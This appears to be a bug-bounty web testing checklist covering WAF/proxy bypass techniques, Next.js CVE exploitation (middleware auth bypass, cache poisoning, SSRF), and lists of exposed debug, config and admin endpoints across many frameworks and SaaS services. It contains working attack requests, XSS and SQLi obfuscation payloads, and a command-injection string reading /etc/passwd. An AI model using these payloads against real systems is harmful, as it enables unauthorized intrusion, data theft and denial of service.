# Web Services Based Checklist

<details>

<summary>WAF &#x26; Reverse Proxies Bypass</summary>

> Run these boxes when a reverse proxy (Nginx/Apache/IIS) or WAF (AWS WAF, Cloudflare, ModSecurity, Akamai…) sits in front of the app and blocks paths/payloads. Two root causes: **(1) Parser discrepancy** — the proxy/WAF and the backend disagree on what the request _means_ (path normalization, header parsing, multipart/XML grammar, character encoding), so the WAF inspects a harmless interpretation while the backend executes the real one; **(2) Inspection gaps** — the WAF simply doesn't look (request too large, wrong content-type, unkeyed location). Order: fingerprint → ACL/path-confusion → header-parsing discrepancy → size-limit bypass → content-type/multipart/XML grammar → character normalization → payload obfuscation → confirm.

> This is a _bypass_ checklist — the goal is to prove the protection can be evaded so the underlying bug (SQLi/XSS/admin-path) still lands. Pair it with the relevant vuln checklist for the actual payload.

***

### 0. Fingerprint the Proxy / WAF

* [ ] Identify the WAF: `Server` header, blocking page text, cookies (`awselb`, `__cfduid`/`cf-ray`, `barra_counter`, `BinarySec`…), unusual block codes (WebKnight `999`, 360 `493`)
* [ ] Provoke it: send `" or 1=1 --` / `<script>alert()</script>` into params and note the block response (code, body, headers)
* [ ] Use `wafw00f` to fingerprint
* [ ] Identify the **backend stack** (Node/PHP/Java/.NET) — parser-discrepancy bypasses are stack-specific
* [ ] Note whether the WAF is inline (CDN) or a module (ModSecurity) — affects which tricks apply

***

### 1. Nginx / Proxy ACL Path-Confusion

> Proxy blocks a path with an exact-match location, but the backend normalizes differently.

* [ ] **Nginx `location = /admin.php { deny }`** → bypass via `/admin.php/index.php` (or `/admin.php/`)
  * root cause: `=` exact match; backend (PHP-FPM) still routes `/admin.php/x` to `admin.php`
  * fix devs miss: should use `~ \.php$` regex
* [ ] **ModSecurity `REQUEST_FILENAME` path-confusion (v3 ≤3.0.12)** — append `;`/path segments so MODSEC sees a different filename than the backend (sicuranext research)
* [ ] **Trailing-char normalization mismatch** — add chars Nginx keeps but the backend strips: `/admin%00`, `/admin%09`, `/admin/.`, `/admin%2e`
* [ ] **Tomcat path-param blacklist bypass:** `/path1/path2/` ≡ `;/path1;foo/path2;bar/;`
* [ ] **IIS/ASP Classic** case/encoding: `<%s%cr%u0131pt>` ≡ `<script>` (dotless-ı normalization)
* [ ] Try `//`, `/./`, `/../`, `;`, `%2f`, `%2e`, backslash `\` to reach a blocked path
* [ ] Case variation on case-insensitive backends: `/Admin`, `/ADMIN.php`

***

### 2. Header-Parsing Discrepancy (WAF vs backend)

> WAF parses a header one way, backend another → smuggle the payload in the part the WAF ignores.

*   [ ] **AWS WAF malformed-header LF trick** — payload on a continuation line the WAF doesn't attribute to the header value but the backend (Node) does:

    ```
    GET / HTTP/1.1
    Host: target.com
    X-Query: Value
    \t' or '1'='1' -- 
    Connection: close
    ```
* [ ] Duplicate headers (WAF reads first, backend reads last — or vice-versa)
* [ ] Header-name casing / whitespace-before-colon / tab folding
* [ ] Put the payload in a header the WAF doesn't inspect (custom `X-*`, `Referer`, `User-Agent`) if the backend uses it in a sink
* [ ] Obscure but parsed: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL` to reach blocked paths

***

### 3. Request-Size Inspection Bypass

> WAFs only inspect up to a byte limit; exceed it and the payload passes uninspected.

* [ ] Identify the limit (AWS WAF defaults: \~8KB for CloudFront, larger for ALB/AppSync)
* [ ] On a POST/PUT/PATCH, **pad the body before the payload** to push the malicious part past the inspection window:
  * junk param/comment then the real injection
* [ ] **`nowafpls`** (Burp ext) — auto-inserts padding to cross the limit
* [ ] Also enables the **WAF-cookie DoS** (see DoS checklist) and oversized-header CPDoS
* [ ] Test JSON/form/multipart bodies — limits differ per content-type

***

### 4. Content-Type / Multipart / XML Grammar Discrepancy (WAFFLED-style)

> Emergency rules that re-parse multipart/XML are fragile — if WAF and backend implement different grammar, the WAF scans a harmless reconstruction while the backend rebuilds the real payload.

**Multipart/form-data:**

* [ ] **Boundary-delimiter manipulation** — remove the `\r\n` before the boundary
* [ ] **Content-Type parameter tweak** — alter/remove the global `Content-Type` name or `boundary=` casing
* [ ] **Content-Disposition disruption** — malform the `Content-Disposition` structure
* [ ] **Disrupted header injection into body** — add redundant headers with broken names in the part
* [ ] **Content-Type tweak in body** — insert chars into the per-part `Content-Type`
* [ ] Mismatched/duplicate `name=` fields (busboy-style reconstruction differences)

**XML:**

* [ ] **DOCTYPE closure confusion** — extra char at the end of the XML body confuses DOCTYPE parsing
* [ ] **Schema closure manipulation** — insert chars/elements/duplicate fields in the schema
* [ ] **Newline abuse** — extra newline before the `Content-Type` header
* [ ] **Content-Type header parameter removal/replacement** — drop or swap the param name
* [ ] (XXE-that-bypasses-WAF — combine with XXE checklist)

**Content-type swap:**

* [ ] Send JSON as `text/plain` / form, or swap to a type the WAF doesn't parse but the backend does

***

### 5. Character Normalization / Encoding

> WAF sees one character set, the backend normalizes to another (the malicious one).

* [ ] **Unicode normalization** — chars that NFKC-fold to `<`, `'`, `/`, keywords after the WAF check (fullwidth `＜script＞`, dotless-ı, ligatures) — see IDN/Unicode-normalization checklist
* [ ] **Overlong / double URL-encoding** — `%252e`, `%c0%ae`, `%u002e` decoded by backend but not WAF
* [ ] **Mixed encoding** in one payload
* [ ] **`<%s%cr%u0131pt>`** → `<script>` (IIS)
* [ ] **Best-fit mapping** — chars the backend maps to ASCII (e.g. `ＳＥＬＥＣＴ`)
* [ ] **Inline-handler first-statement parsing bypass** — WAF parses only the first JS statement in an event handler; prefix a harmless one: `onfocus="(history.length);PAYLOAD"` + `#elementId` fragment for click-less focus → XSS executes, WAF misses it

***

### 6. Payload Obfuscation (regex-filter evasion)

* [ ] **Comment/junk insertion** — `<script>+-+-1-+-+confirm()</script>`, SQL inline comments `/**/`, `/*!50000*/`
* [ ] **Whitespace/linebreak (CR/LF)** inside the payload to break regex: `<iframe src=" j a v a s c r i p t :confirm()">`
* [ ] **HTML-entity / numeric encoding** in attributes: `href=j&#97v&#97script&#x3A;&#97lert(1)`
* [ ] **Padding attributes** to push past regex windows: `<a aaaa aaaaa ... href=...>`
* [ ] **Uninitialized bash vars** for command injection: `$aaaa/bin$bbbb/cat $cccc/etc$dddd/passwd` (null/empty expansion)
* [ ] **`$IFS`** for spaces (bare `$IFS` often passes where `${IFS}` is blocked)
* [ ] **SSL/TLS-cipher abuse** — some WAFs fail to inspect certain TLS configs (0x09AL)
* [ ] **SNI-based backend reach** — if proxy uses SNI as backend address → SSRF (see SSRF checklist)
* [ ] Tooling: SQLMap `--tamper=`, Awesome-WAF / Bo0oM / kh4sh3i cheat-sheets, AutoSpear, nuclei WAF-bypass templates

***

### 7. Confirm the Bypass

* [ ] Same payload: blocked without the trick, **passes** with it (show both requests)
* [ ] The underlying vuln actually fires post-bypass (SQLi result / XSS alert / admin page reached)
* [ ] Note the exact discrepancy: which component normalized/parsed differently
* [ ] Note that a WAF bypass alone is usually **informative**, not a finding — chain it to a real vuln for impact
* [ ] Document: WAF/proxy + version, backend stack, the bypass primitive (path/header/size/grammar/encoding), and the vuln it unlocked

</details>

<details>

<summary><strong>Symfony PHP</strong></summary>

* [ ] Symfony Profiler Enabled

```
/app_dev.php
/app_dev.php/_profiler
/_profiler
/_profiler/latest
/_profiler/search
/_profiler/phpinfo
/_profiler/{token}
/_wdt/{token}
/app_example.php
/app_test.php
/index_dev.php
/config.php
/_configurator/
/_configurator/steps
/_configurator/step/{index}
```

</details>

<details>

<summary><strong>Laravel</strong></summary>

* [ ] Laravel Debug Mode / Telescope / Ignition / Horizon / Pulse

```
/.env
/_debugbar
/_debugbar/open
/_debugbar/clockwork/{id}
/telescope
/telescope/requests
/telescope/exceptions
/ignition/execute-solution
/ignition/update-options
/horizon
/horizon/api/*
/pulse
```

</details>

<details>

<summary><strong>WordPress</strong></summary>

* [ ] WordPress Debug / Config / XMLRPC / Users Enum

```
/wp-config.php
/wp-config.php~
/wp-config.php.bak
/wp-config.php.old
/wp-admin/install.php
/xmlrpc.php
/wp-json/wp/v2/users
/wp-json/wp/v2/users/{id}
/readme.html
/license.txt
/wp-includes/version.php
```

</details>

<details>

<summary><strong>Django</strong></summary>

* [ ] Django Debug Mode / Admin / Debug Toolbar

```
/.env
/admin
/admin/login
/debug
/__debug__
/static/debug_toolbar/
/djdt/
/djdt/debug_toolbar
```

</details>

<details>

<summary><strong>Rails</strong></summary>

* [ ] Rails Console / Info / DB / Pwned

```
/rails/info/properties
/rails/console
/rails/db
/pwned
/.env
/config/database.yml
```

</details>

<details>

<summary><strong>Express.js / Node.js</strong></summary>

* [ ] Debug Routes / Env / Config Exposure

```
/.env
/debug
/trace
/env
/config
/status
/version
```

</details>

<details>

<summary><strong>Flask</strong></summary>

* [ ] Flask Debug Mode / Console

```
/.env
/console
/debug
/flask.debug
/_debug
```

</details>

<details>

<summary><strong>GraphQL</strong></summary>

* [ ] Introspection Enabled / IDEs

```
/graphql
/graph
/graphiql
/graphql/console
/graphql.php
/graphiql.php
/api/graphql
/v1/graphql
/v1/explorer
/v1/graphiql
/altair
/playground
/graphql-playground
/graphiql/fiddle
```

</details>

<details>

<summary><strong>Next.js</strong></summary>

> Run these boxes against any Next.js app (React/Vercel framework). Next.js has a rich, framework-specific attack surface: **middleware auth bypass**, **internal-header cache poisoning → DoS**, **SSRF** (Server Actions + image optimization), **request smuggling**, and **source/env exposure**. Most high-impact bugs are version-gated, so fingerprint the version first. Order: fingerprint → middleware bypass → cache-poisoning DoS chains → SSRF → smuggling/DoS → source/env exposure → impact. (Nuxt cache-poisoning at the end since it's the Vue analogue.)

> ⚠️ Cache-poisoning and DoS tests can take a page down for **all** users — test on non-critical endpoints (`/test`), use `Accept-Encoding: none` if it's in the cache key to scope the poison to yourself, and confirm DoS is in-scope first.

***

### 0. Fingerprint Next.js & Version

* [ ] Indicators: `_next/` static paths, `/api/` routes, `X-Powered-By: Next.js`, `<script id="__NEXT_DATA__">`
* [ ] Extract `buildId` + version clues from `__NEXT_DATA__` JSON
* [ ] Detect **App Router** (v13+) vs **Pages Router** (RSC/Server Actions only exist in App Router)
* [ ] Detect deployment: **self-hosted** (`next start` + `output: standalone`) vs **Vercel** (many bugs only affect self-hosted; Vercel strips internal headers)
* [ ] Detect CDN (`Server: cloudflare`, `X-Vercel-Cache`, CloudFront/Akamai headers) — required for cache-poisoning chains
* [ ] Detect SSR pages (`getServerSideProps`, dynamic data like `/dashboard`) — the cache-poisoning targets

***

### 1. Middleware Authorization Bypass — CVE-2025-29927 (critical)

> Next.js trusted the internal `x-middleware-subrequest` header from external clients → middleware (auth, redirects, CSP) skipped entirely.

* [ ] **Affected:** <12.3.5, <13.5.9, <14.2.25, <15.2.3 (11.1.4 → 15.2.2 exploitable). Self-hosted with middleware.
* [ ] Find routes protected by middleware (admin, dashboard, authed API)
* [ ] Baseline: `GET /admin` → 401/redirect
*   [ ] Inject the header and re-test:

    ```
    GET /admin HTTP/1.1
    Host: target
    x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    ```
* [ ] Try version-specific middleware paths/values:
  * [ ] `x-middleware-subrequest: middleware`
  * [ ] `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`
  * [ ] `x-middleware-subrequest: pages/_middleware` (pre-12.2)
  * [ ] `x-middleware-subrequest: src/middleware:src/middleware...` (App Router)
* [ ] One-liner: `curl -i -H "x-middleware-subrequest: middleware" https://target/protected`
* [ ] 200 with protected content = bypass confirmed
* [ ] Also test **pathname-based authz bypass** (CVE-2024-51479: <14.2.15) — reach a protected path the middleware gates on pathname
* [ ] Secondary impacts: CSP-header stripping, forced cache-poisoning of 404 (DoS)
* [ ] Tooling: nuclei `CVE-2025-29927`

***

### 2. Cache-Poisoning DoS — Internal Headers (Next.js "stale elixir" + middleware CP)

> Internal Next.js headers that CDNs don't strip/vary on → poison a cacheable empty/error/JSON response → page unusable for all users.

* [ ] Confirm caching: repeated requests show `Cache-Control`/CDN cache headers; params ignored in cache key (`/?test=1` == `/`)
* [ ] **Middleware prefetch (CVE-2023-46298, <13.4.20):** `x-middleware-prefetch: 1` on a GET → empty `{}`; re-request without header — empty = poisoned
* [ ] **`__nextDataReq` parameter:** `GET /poc?__nextDataReq=1` → JSON `pageProps`; re-request `/poc` → JSON served = poisoned
* [ ] **`x-now-route-matches` header:** `GET /poc?__nextDataReq=1` + `x-now-route-matches: 1` → look for `Cache-Control: s-maxage=1, stale-while-revalidate`; re-request for JSON
* [ ] **Data route:** `GET /_next/data/{buildId}/poc.json` + `x-now-route-matches: 1` → JSON cached → `/poc` serves JSON
* [ ] **`x-invoke-status: 200`** (non-edge runtime): overwrites status to cacheable 200 while invoking the error page → cache the error page → DoS
* [ ] **`x-invoke-error: {"message":"<>"}`**: inject custom error JSON (needs valid `invokePath`)
* [ ] Verify each header actually passes through the CDN/proxy (not stripped)

***

### 3. RSC Cache Poisoning — `Vary: Rsc` ignored by CDNs

> React Server Components use `_rsc=<rand>` as cache-buster + `Vary: Rsc`. CDNs that ignore `Vary` (Cloudflare except `accept-encoding`, CloudFront removes `Vary`, Akamai default-removal) → poison main pages with the RSC binary payload.

* [ ] Identify RSC pages (App Router, v13+)
* [ ] `GET /` with header `Rsc: 1` and **no** `_rsc` query param → RSC binary returned
* [ ] Re-request `/` without the header → if RSC payload served, poison succeeded (root page broken → DoS)
* [ ] Confirm the CDN ignores `Vary: Rsc` (cache persists across header variants)
* [ ] Mass-scan assets for this (zhero got $2000 on this class)

***

### 4. Cache Poisoning → Stored XSS / Deception (escalation beyond DoS)

*   [ ] **Stored XSS via cached SSR reflection:** find SSR page reflecting request data (User-Agent, cookies, locale, CSRF token), then:

    ```
    GET /poc?__nextDataReq=1
    User-Agent: <img src=x onerror=alert(document.domain)>
    x-now-route-matches: 1
    ```

    → if cached `/poc` becomes `text/html` with the payload, every visitor gets XSS
* [ ] Common reflections to test: User-Agent, locale/theme cookies, session IDs, CSRF headers
* [ ] **Cache deception:** cache a victim-specific SSR response (session data) under a path you can read

***

### 5. SSRF

*   [ ] **Server Actions SSRF (CVE-2024-34351, 13.4.0–<14.1.1, self-hosted):** when a Server Action redirects to a relative `/` path, a modified `Host` header makes the server fetch attacker-chosen URLs (full response readable):

    ```
    POST /some-server-action
    Host: attacker.com
    ```

    → reach internal services / cloud metadata (`169.254.169.254`); read full HTTP response
* [ ] **Image-optimization SSRF (`/_next/image`):** `GET /_next/image?url=http://<collab>&w=128&q=75` → blind SSRF if `url` not allowlisted
  * [ ] If allowlisted (`images.domains`/`remotePatterns`): chain an **open redirect or arbitrary file upload on an allowlisted domain** → host a polyglot (PNG magic bytes + HTML `<meta refresh>` to `169.254.169.254`) → `/_next/image?url=https://allowed-s3/redirect-polyglot.png` (note: server _fetches_, doesn't render — needs an HTTP redirect, not client-side meta-refresh, to pivot)
  * [ ] Outdated versions: escalate to XSS / full XML-response leak via SSRF
* [ ] **Custom-middleware SSRF (CVE-2025-57822):** self-hosted apps misusing `next()` — improper response handling → SSRF

***

### 6. Request Smuggling & DoS

* [ ] **Response-queue poisoning (CVE-2024-34350, <14.1.1):** crafted request interpreted as both one and two requests → desync (see HTTP smuggling checklist)
* [ ] **Rewrite smuggling (CVE-2026-29057):** when Next.js rewrites/proxies to an external backend, a `DELETE`/`OPTIONS` + `Transfer-Encoding: chunked` triggers boundary disagreement
* [ ] **Server Action hang DoS (CVE-2024-56332):** craft requests that leave Server Actions hanging until the host cancels the function
* [ ] **Server Function deserialization DoS (CVE-2026-23864 / CVE-2025-49826-class):** crafted request to an App Router Server Function → excessive CPU / OOM / crash
* [ ] **Image-optimization DoS (CVE-2024-47831):** unoptimized image requests → excessive CPU
* [ ] **WAF request-size DoS** (your page): large dummy param + injection payload reflected into a cookie that the WAF later blocks → per-victim 403 (use `nowafpls`)

***

### 7. Source Code & Secret Exposure

*   [ ] Env/debug files:

    ```
    /.env  /.env.local  /.env.production  /.env.development
    /.next/  /_next/static/development  /api/debug
    ```
* [ ] **Dev-server source exposure (CVE-2025-48068, <15.2.2):** if `npm run dev` is running (App Router), a malicious page the dev visits can read limited source — relevant for exposed dev instances
* [ ] Source maps under `/_next/static/**/*.js.map` → recover original TS/JSX
* [ ] `__NEXT_DATA__` / RSC payloads leaking server props (tokens, internal IDs, hidden data)
* [ ] `/_next/static/chunks/` — read bundled JS for endpoints, keys, feature flags

***

### 8. Nuxt Cache-Poisoning DoS (Vue analogue) — CVE-2025-27415

> Same family for Nuxt (3.0.0–3.15.2): a lax URL regex lets query/hash force JSON payload rendering on main routes → cached → DoS.

* [ ] Fingerprint Nuxt: `_nuxt/`, `/api/`, `<script id="__NUXT_DATA__">`; confirm version 3.0.0–3.15.2; confirm CDN + caching
* [ ] **Query-based:** `GET /?poc=/_payload.json` → JSON 200; re-request `/` → JSON served = poisoned
* [ ] **Hash-based:** `GET /#/_payload.json` (via proxy) → JSON 200; re-request `/` → poisoned (fails if CDN encodes `#` → `%23` → 404)
* [ ] Safeguard with `Accept-Encoding: none` if in cache key; false-positives: Nitro `/api`, 3.16.0+, no CDN, params in cache key

***

### 9. Confirm Impact

* [ ] Auth bypass (middleware) → access admin/protected routes & APIs
* [ ] Cache-poisoning DoS → page unusable for all users (show persistence on re-request)
* [ ] Cache-poisoning → stored XSS (all visitors) / cache deception (session leak)
* [ ] SSRF → cloud metadata / internal services (full response read)
* [ ] Request smuggling → response-queue poisoning
* [ ] DoS → CPU/OOM/hang or per-victim WAF lockout
* [ ] Source/secret exposure → keys, endpoints, source
* [ ] Always note the **exact version + deployment mode** (self-hosted vs Vercel) and scope the PoC (single endpoint, `Accept-Encoding: none`) to avoid impacting real users

</details>

<details>

<summary><strong>Strapi</strong></summary>

* [ ] Strapi Admin / Dashboard / Env

```
/admin
/dashboard
/.env
/strapi
/plugins/users-permissions
```

</details>

<details>

<summary><strong>Spring Boot</strong></summary>

* [ ] Actuator Endpoints / Jolokia / Hawtio

```
/actuator
/actuator/env
/actuator/beans
/actuator/mappings
/actuator/health
/actuator/info
/actuator/heapdump
/actuator/threaddump
/actuator/loggers
/actuator/conditions
/jolokia
/jolokia/exec
/hawtio
/api/hawtio
```

</details>

<details>

<summary><strong>ASP.NET</strong></summary>

* [ ] Debug / Trace / Config Exposure

```
/trace.axd
/elmah.axd
/Web.config
/web.config.bak
/web.config~
/App_config/connectionStrings.config
```

</details>

<details>

<summary><strong>PHP General</strong></summary>

* [ ] PHP Info / Config / Backups

```
/phpinfo.php
/info.php
/test.php
/php.ini
/php.ini~
/php.ini.bak
/server-status
/server-info
```

</details>

<details>

<summary><strong>Apache</strong></summary>

* [ ] Server Status / Info / Mod Pages

```
/server-status
/server-info
/mod_status
/.htaccess
/.htpasswd
```

</details>

<details>

<summary><strong>Nginx</strong></summary>

* [ ] Status / Stub Status

```
/nginx_status
/status
/stub_status
```

</details>

<details>

<summary><strong>Tomcat</strong></summary>

* [ ] Manager / Host Manager / Examples

```
/manager/html
/host-manager/html
/examples
/docs
/admin
```

</details>

<details>

<summary><strong>Kibana</strong></summary>

* [ ] Kibana Dashboard / Timelion / Console

```
/app/kibana
/app/timelion
/app/console
/api/console
```

</details>

<details>

<summary><strong>Elasticsearch</strong></summary>

* [ ] Cluster Info / Indices / Cat APIs

```
/_cat
/_cat/indices
/_cat/nodes
/_cluster/health
/_nodes/stats
/*/_search
```

</details>

<details>

<summary><strong>MongoDB</strong></summary>

* [ ] Mongo Express / Admin UI

```
/dbadmin
/mongo
/admin/mongo
/me
```

</details>

<details>

<summary><strong>Redis</strong></summary>

* [ ] Redis CLI / Web UI

```
/redis
/phpredisadmin
/redis-cli
```

</details>

<details>

<summary><strong>Docker</strong></summary>

* [ ] Docker API / Registry / Swarm

```
/_ping
/v1.41/info
/v1.41/containers/json
/v2/_catalog
```

</details>

<details>

<summary><strong>Swagger / OpenAPI</strong></summary>

* [ ] Swagger UI / OpenAPI Docs Exposure

```
/swagger
/swagger-ui
/swagger-ui.html
/swagger-ui/index.html
/api-docs
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/redoc
```

</details>

<details>

<summary><strong>Grafana</strong></summary>

* [ ] Grafana UI / Public Dashboards / Health

```
/grafana
/grafana/login
/grafana/public-dashboards
/public-dashboards
/api/health
/api/search
```

</details>

<details>

<summary><strong>Prometheus</strong></summary>

* [ ] Prometheus UI / Targets / Metrics

```
/graph
/targets
/service-discovery
/metrics
/api/v1/status/config
/api/v1/targets
```

</details>

<details>

<summary><strong>phpMyAdmin / Adminer</strong></summary>

* [ ] Database Admin Panels Exposed

```
/phpmyadmin
/phpMyAdmin
/pma
/dbadmin
/adminer
/adminer.php
```

</details>

<details>

<summary><strong>MinIO</strong></summary>

* [ ] MinIO Console / Health Endpoints

```
/minio
/minio/login
/minio/health/live
/minio/health/ready
```

</details>

<details>

<summary><strong>General Misconfig Checks</strong></summary>

* [ ] Environment Files

```
/.env
/.env.local
/.env.production
/.env.example
/config.php
/configuration.php
/settings.php
```

* [ ] Backup / Source Files

```
/*.bak
/*.old
/*.txt
/*~
/backup
/backups
/*.sql
/*.zip
/*.tar.gz
```

* [ ] Directory Listing / Uploads

```
/uploads/
/files/
/assets/
/static/
/media/
/user_uploads/
```

* [ ] Git / SVN Exposure

```
/.git/
/.git/HEAD
/.git/config
/.svn/entries
/.hg/
```



</details>

<details>

<summary>Postman API Platform</summary>

* [ ] Public Workspaces

```
https://www.postman.com/{companyName}/?tab=workspaces
```



</details>

<details>

<summary>Salesforce</summary>

* [ ] Salesforce Lightning Aura Components Enabled

```
- Test:
POST /aura HTTP/2
Host: {TARGET}.lightning.force.com
Content-Type: application/json

{}
------------------------
- FQDNs:
*.force.com
*.secure.force.com
*.live.siteforce.com
---------------------------
- Other Endpoints
/sfsites/aura
/s/sfsites/aura
```



</details>

<details>

<summary>Trello</summary>

* [ ] View Permissions on Trello Boards

```
site:trello.com "company"
https://trello.com/b/{BOARD_ID}
```



</details>

<details>

<summary>Figma</summary>

* [ ] View access misconfiguration

```
https://www.figma.com/file/{DesignID}/{DesignFileName}
```



</details>

<details>

<summary>Freshworks Freshservice</summary>

* [ ] Open User Registration

```
https://<companyName>.freshservice.com/support/signup
```



</details>

<details>

<summary>Slack</summary>

* [ ] No Admin Approval for Invitations

To check if you have permissions to invite a new member:

1. Sign in to your Slack Workspace
2. Open any channel
3. Click on **Add people**
4. A popup will open up, enter the user's email address
5. Finally, click **Add**

These reproduction steps prove that you're able to invite new members without approval from an administrator.

![](https://bugology.intigriti.io/misconfig-mapper-docs/~gitbook/image?url=https%3A%2F%2F867675796-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHax8VYP6nSo5n66iSR0Z%252Fuploads%252Fgit-blob-de8e86fddf7e79b52a5ffa21a075887e53797106%252Fimage%2520%285%29.png%3Falt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=3559249d\&sv=2)



</details>

<details>

<summary>Atlassian Bitbucket</summary>

* [ ] Publicly Accessible Private Repositories

```
https://bitbucket.org/{WORKSPACE_ID}
site:bitbucket.org inurl:/workspace/projects
```

</details>

<details>

<summary>Atlassian Confluence</summary>

* [ ] [Anonymous access to Remote API](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-confluence/anonymous-access-to-remote-api)

{% code overflow="wrap" %}
```http
## XML-RPC HTTP Request to retrieve a specific page for example:
POST /rpc/xmlrpc HTTP/1.1
Host: confluence.example.com
Content-Type: text/xml
...

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
 <methodName>confluence2.getPage</methodName>
 <params>
  <param>
   <value>
    <string>{SPACE_KEY}</string>
   </value>
  </param>
  <param>
   <value>
    <string>{PAGE_TITLE}</string>
   </value>
  </param>
 </params>
</methodCall>

--------------------------------
## Curl:
curl -X POST -H 'Content-Type: text/xml' -d '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>confluence2.getPage</methodName><params><param><value><string>{SPACE_KEY}</string></value></param><param><value><string>{PAGE_TITLE}</string></value></param></params></methodCall>' http://confluence.example.com/rpc/xmlrpc

------------------------------------
## SOAP: /rpc/soap-axis/confluenceservice-v2
```
{% endcode %}

* [ ] [Disabled XSRF Protection](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-confluence/disabled-xsrf-protection)

{% code overflow="wrap" %}
```
In case XSRF Protection is turned off, bad actors could post comments on other user's behalf by just sending them a link to an attacker controlled site that replicates the POST request.
```
{% endcode %}

* [ ] [User Email Visibility](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-confluence/user-email-visibility)

{% code overflow="wrap" %}
```
There is no specific testing procedure for this misconfiguration. Email addresses are visible next to the user's name on posts for example.
```
{% endcode %}

* [ ] [Misconfigured Spaces](https://github.com/intigriti/misconfig-mapper-docs/blob/gitbook/services/atlassian-confluence/misconfigured-spaces.md)

{% code overflow="wrap" %}
```
Visit the following application route to check if anonymous users can view and read any information on Confluence Spaces:

https://<companyName>.atlassian.net/wiki/spaces
```
{% endcode %}



</details>

<details>

<summary>Atlassian Jira</summary>

* [ ] [Open User Registration](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-jira/open-user-registration)

{% code overflow="wrap" %}
```
You can cross-check if user registration is open for anyone by navigating to the following app route:

/secure/Signup!default.jspa
```
{% endcode %}

* [ ] [Misconfigured Email Visibility](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-jira/atlassian-jira-email-visibility)

{% code overflow="wrap" %}
```
Open up any user's profile in your Jira instance as an anonymous user and verify that you can view the email address of the user.
```
{% endcode %}

* [ ] [Open Service Desk registration](https://bugology.intigriti.io/misconfig-mapper-docs/services/atlassian-jira/atlassian-jira-service-desk-open-signups)

{% code overflow="wrap" %}
```
Navigate to the following app route and check if signups are enabled:

/servicedesk/customer/user/login
```
{% endcode %}



</details>

<details>

<summary>AWS S3</summary>

* [ ] Misconfigured List Permissions

```
aws s3 ls s3://{BUCKET_NAME} --no-sign-request
```



</details>

<details>

<summary>Cloudflare R2</summary>

* [ ] R2.DEV Enabled

{% code overflow="wrap" %}
```
You can make use of search syntaxis supported by several popular search engines like Google to enumerate R2 buckets belonging to your target company or organization:

site:.r2.dev "company"
```
{% endcode %}



</details>

<details>

<summary>Google Groups</summary>

* [ ] Misconfigured read permissions

```
site:groups.google.com "{companyName}"
```



</details>

<details>

<summary>Google Docs</summary>

* [ ] Misconfigured read permissions

```
https://docs.google.com/document/d/{documentId}/edit
```



</details>

<details>

<summary>Google Cloud Storage Bucket</summary>

* [ ] Misconfigured access controls

{% code overflow="wrap" %}
```
https://{companyName}.storage.googleapis.com/
https://storage.googleapis.com/{companyName}

Indexing can also be allowed, to cross-check, you can make use of search filters that search engines like Google provide:

site:storage.googleapis.com "{companyName}"
```
{% endcode %}



</details>

<details>

<summary>Google OAuth</summary>

* [ ] Unrestricted email domains

{% code overflow="wrap" %}
```
https://accounts.google.com/o/oauth2/v2/auth?
  response_type=code&
  client_id=1234.apps.googleusercontent.com&
  ...
  hd=company.com

--------------------------------
Change it to example.com:
--------------------------------

https://accounts.google.com/o/oauth2/v2/auth?
  response_type=code&
  client_id=1234.apps.googleusercontent.com&
  ...
  hd=example.com
```
{% endcode %}



</details>

<details>

<summary>Jenkins</summary>

* [ ] Open Signups

```
- Enumerate jenkist subdomains
jenkist.domain.com

- Check those endpoints
/signup
/jenkins/signup
```

* [ ] Public Groovy Script Console

{% code overflow="wrap" %}
```bash
- Check if Groovy Script Console is publicly accessible:

/script

---------------------------------
- Test:

curl -s 'https://jenkins.{HOST}/script' -X 'POST' --data 'script={SCRIPT}'

or:

curl -s 'https://jenkins.{HOST}/scriptText' -X 'POST' --data 'script={SCRIPT}'
```
{% endcode %}



</details>

<details>

<summary>GitLab</summary>

* [ ] Gitlab Private Source Code Snippets Exposed

{% code overflow="wrap" %}
```
/explore/snippets
```
{% endcode %}



</details>

<details>

<summary>Drupal</summary>

```
- Brute Force IDs
/node/{ID}
```



</details>

### Automation

{% embed url="https://bugology.intigriti.io/misconfig-mapper-docs" %}
